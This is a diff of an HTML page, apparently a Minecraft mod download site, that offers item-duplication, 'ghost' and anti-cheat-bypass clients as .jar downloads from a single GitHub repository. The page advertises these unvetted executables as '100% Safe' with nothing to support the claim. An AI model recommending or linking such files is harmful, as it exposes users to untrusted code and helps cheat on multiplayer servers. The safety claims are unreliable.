@@ -32,15 +32,15 @@
             
             <div class="stats-container">
                 <div class="stat-box">
-                    <h3>50K+</h3>
+                    <h3 id="stat-downloads">0</h3>
                     <p>Downloads</p>
                 </div>
                 <div class="stat-box">
-                    <h3>100%</h3>
+                    <h3 id="stat-safe">0</h3>
                     <p>Safe</p>
                 </div>
                 <div class="stat-box">
-                    <h3>24/7</h3>
+                    <h3 id="stat-support">0</h3>
                     <p>Support</p>
                 </div>
             </div>
@@ -55,39 +55,32 @@
 
     <section id="mods" class="mods-section">
         <h2 class="section-title">Available Mods</h2>
-        
         <div id="mods-grid" class="mods-grid">
-            
             <div class="mod-card">
                 <h3>Donut SMP Dupe Client</h3>
                 <p>Advanced duplication client with intuitive UI and powerful features for SMP servers.</p>
                 <button class="btn-secondary" onclick="showModDetails('donut')">View Details</button>
             </div>
-
             <div class="mod-card">
                 <h3>Krypton Client</h3>
                 <p>Optimization mod that improves network performance and reduces lag on multiplayer servers.</p>
                 <button class="btn-secondary" onclick="showModDetails('krypton')">View Details</button>
             </div>
-
             <div class="mod-card">
                 <h3>Prestige Client</h3>
                 <p>Feature-rich utility client with advanced tools for competitive Minecraft gameplay.</p>
                 <button class="btn-secondary" onclick="showModDetails('prestige')">View Details</button>
             </div>
-
             <div class="mod-card">
                 <h3>Meteor Client</h3>
                 <p>Popular Fabric utility mod with an extensive set of features and regular updates.</p>
                 <button class="btn-secondary" onclick="showModDetails('meteor')">View Details</button>
             </div>
-
             <div class="mod-card">
                 <h3>Baritone Farm Builder</h3>
                 <p>Automated pathfinding and farming system that can build complex farms automatically.</p>
                 <button class="btn-secondary" onclick="showModDetails('baritone')">View Details</button>
             </div>
-
             <div class="mod-card">
                 <h3>Vape V4</h3>
                 <p>Advanced ghost client with bypasses for popular anti-cheat systems and premium features.</p>
@@ -96,46 +89,40 @@
         </div>
 
         <div id="mod-details-container" class="mod-details-container" style="display: none;">
-            
             <div id="donut-details" class="mod-detail-content" style="display: none;">
                 <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
                 <h2>Donut SMP Dupe Client</h2>
-                <p>The Donut SMP Dupe Client is a specialized utility mod designed for SMP servers. It features an intuitive user interface and powerful duplication capabilities that work on various server versions.</p>
+                <p>Advanced duplication client with intuitive UI and powerful features for SMP servers.</p>
                 <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/DonutSMPDupe.jar" class="btn-primary download-btn">Download Now</a>
             </div>
-
             <div id="krypton-details" class="mod-detail-content" style="display: none;">
                 <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
                 <h2>Krypton Client</h2>
-                <p>Krypton is a Minecraft mod designed to optimize the game's network stack and reduce lag on multiplayer servers.</p>
+                <p>Optimization mod that improves network performance and reduces lag on multiplayer servers.</p>
                 <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/Krypton-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
             </div>
-
             <div id="prestige-details" class="mod-detail-content" style="display: none;">
                 <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
                 <h2>Prestige Client</h2>
-                <p>Prestige Client is a feature-rich utility mod that offers advanced tools for competitive Minecraft gameplay.</p>
+                <p>Feature-rich utility client with advanced tools for competitive Minecraft gameplay.</p>
                 <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/Prestige-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
             </div>
-
             <div id="meteor-details" class="mod-detail-content" style="display: none;">
                 <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
                 <h2>Meteor Client</h2>
-                <p>Meteor Client is one of the most popular Fabric utility mods available. It boasts an extensive set of features and regular updates.</p>
+                <p>Popular Fabric utility mod with an extensive set of features and regular updates.</p>
                 <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/Meteor-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
             </div>
-
             <div id="baritone-details" class="mod-detail-content" style="display: none;">
                 <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
                 <h2>Baritone Farm Builder</h2>
-                <p>Baritone Farm Builder is an automated pathfinding system that can construct complex farms with minimal user input.</p>
+                <p>Automated pathfinding and farming system that can build complex farms automatically.</p>
                 <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/baritone-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
             </div>
-
             <div id="vape-details" class="mod-detail-content" style="display: none;">
                 <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
                 <h2>Vape V4</h2>
-                <p>Vape V4 is an advanced ghost client designed for competitive Minecraft gameplay with sophisticated bypasses.</p>
+                <p>Advanced ghost client with bypasses for popular anti-cheat systems and premium features.</p>
                 <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/vapeV4-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
             </div>
         </div>
@@ -149,20 +136,15 @@
             </div>
             <div class="footer-col">
                 <h3>Quick Links</h3>
-                <a href="#">Home</a>
-                <a href="#mods">Mods</a>
-                <a href="#about">About</a>
-                <a href="#support">Support</a>
+                <a href="#">Home</a><a href="#mods">Mods</a><a href="#about">About</a><a href="#support">Support</a>
             </div>
             <div class="footer-col">
                 <h3>Legal</h3>
-                <a href="#">Terms of Service</a>
-                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a><a href="#">Privacy Policy</a>
             </div>
             <div class="footer-col">
                 <h3>Support</h3>
-                <a href="#">Contact Us</a>
-                <a href="#">FAQ</a>
+                <a href="#">Contact Us</a><a href="#">FAQ</a>
             </div>
         </div>
         <div class="footer-bottom">
